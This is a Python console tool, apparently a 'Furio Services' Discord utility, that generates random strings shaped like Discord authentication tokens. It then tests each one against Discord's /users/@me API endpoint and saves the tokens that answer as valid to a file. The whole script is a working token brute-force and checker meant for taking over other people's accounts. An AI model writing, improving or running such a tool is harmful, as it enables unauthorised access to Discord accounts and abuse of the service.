from colorama import Fore, init
import os, sys, time, random, string, requests

init(autoreset=True)

# ========== BANNER FUNKTION ==========
def displayBanner():
    print(Fore.MAGENTA + "___________           .__           " + Fore.WHITE + " _________                  .__                     ")
    print(Fore.MAGENTA + "\\_   _____/_ _________|__| ____    " + Fore.WHITE + "/   _____/ ______________  _|__| ____  ____   ______")
    print(Fore.MAGENTA + " |    __)|  |  \\_  __ \\  |/  _ \\   " + Fore.WHITE + "\\_____  \\_/ __ \\_  __ \\  \\/ /  |/ ___\\/ __ \\ /  ___/")
    print(Fore.MAGENTA + " |     \\ |  |  /|  | \\/  (  <_> )  " + Fore.WHITE + "/        \\  ___/|  | \\/\\   /|  \\  \\__\\  ___/ \\___ \\ ")
    print(Fore.MAGENTA + " \\___  / |____/ |__|  |__|\\____/  " + Fore.WHITE + "/_______  /\\___  >__|    \\_/ |__|\\___  >___  >____  >")
    print(Fore.MAGENTA + "     \\/                           " + Fore.WHITE + "        \\/     \\/                    \\/    \\/     \\/")
    print(Fore.MAGENTA + "\n                                   discord.gg/7yxyM2mfwp\n" + Fore.RESET)

# ========== MENU FUNKTION ==========
def display_custom_menu():
    os.system("cls")
    displayBanner()
    
    print(Fore.LIGHTWHITE_EX + "[" + Fore.MAGENTA + "1" + Fore.LIGHTWHITE_EX + "] Generate Tokens\n")
    print(Fore.LIGHTWHITE_EX + "[" + Fore.MAGENTA + "2" + Fore.LIGHTWHITE_EX + "] Check Tokens\n")
    print(Fore.LIGHTWHITE_EX + "[" + Fore.MAGENTA + "3" + Fore.LIGHTWHITE_EX + "] Exit\n")
    print(Fore.LIGHTWHITE_EX + "[" + Fore.MAGENTA + "+" + Fore.LIGHTWHITE_EX + "] Select an option: ", end="")
    print()

# ========== TOKEN GENERATOR ==========
def generate_tokens():
    os.system("cls")
    count = 0
    print(Fore.LIGHTWHITE_EX + "[" + Fore.MAGENTA + "!" + Fore.LIGHTWHITE_EX + "] Amount to generate: ", end="")
    cantidad = input()
    current_path = os.path.dirname(os.path.realpath(__file__))

    while int(count) < int(cantidad):
        Generated = (
            "NT" + random.choice(string.ascii_letters) +
            ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(21)) + "." +
            random.choice(string.ascii_letters).upper() +
            ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(5)) + "." +
            ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(27))
        )
        with open(current_path + "/Generated.txt", "a") as f:
            f.write(Generated + "\n")
        print(Fore.CYAN + "Token: " + Fore.RESET + Generated)
        count += 1

    print("\n" + Fore.RED + "Tokens generated successfully!")
    print(Fore.WHITE + "Tokens saved in Generated.txt")
    input(Fore.MAGENTA + "\nPress enter to return to menu")

# ========== TOKEN CHECKER ==========
def check_tokens():
    os.system("cls")
    print(Fore.YELLOW + "\nChecking tokens...\n")
    valid_tokens = []

    try:
        with open('Generated.txt', 'r') as f:
            tokens = [line.strip() for line in f if line.strip()]
            
        if not tokens:
            print(Fore.RED + "No tokens found in Generated.txt!")
            return

        for token in tokens:
            headers = {
                'Authorization': token,
                'Content-Type': 'application/json'
            }

            try:
                response = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
                
                if response.status_code == 200:
                    print(f"{Fore.GREEN}[VALID] > {Fore.RESET}{token}")
                    valid_tokens.append(token)
                elif response.status_code == 401:
                    print(f"{Fore.RED}[INVALID] > {Fore.RESET}{token}")
                elif response.status_code == 403:
                    print(f"{Fore.YELLOW}[LOCKED/BANNED] > {Fore.RESET}{token}")
                else:
                    print(f"{Fore.LIGHTBLACK_EX}[UNKNOWN {response.status_code}] > {Fore.RESET}{token}")
            except requests.exceptions.RequestException as e:
                print(f"{Fore.RED}[ERROR] Request failed for token: {token}\nReason: {e}")

        # Save valid tokens to Valid.txt
        with open('Valid.txt', 'w') as valid_file:
            for vt in valid_tokens:
                valid_file.write(vt + "\n")

        # Clear all tokens from Generated.txt
        open('Generated.txt', 'w').close()

        print(Fore.CYAN + f"\nCheck complete! {len(valid_tokens)} valid token(s) saved in Valid.txt.")

    except FileNotFoundError:
        print(Fore.RED + "Generated.txt not found!")

    input(Fore.MAGENTA + "\nPress enter to return to menu")

# ========== EXIT ==========
def exit_program():
    os.system("cls")
    print(Fore.RED + "Closing!")
    print(Fore.GREEN + "Have a good day :D")
    time.sleep(2)
    sys.exit()

# ========== MAIN LOOP ==========
while True:
    display_custom_menu()
    opcion = input()

    if opcion == '1':
        generate_tokens()
    elif opcion == '2':
        check_tokens()
    elif opcion == '3':
        exit_program()
    else:
        print(Fore.RED + "Invalid option. Please choose 1, 2 or 3.")
        time.sleep(1)
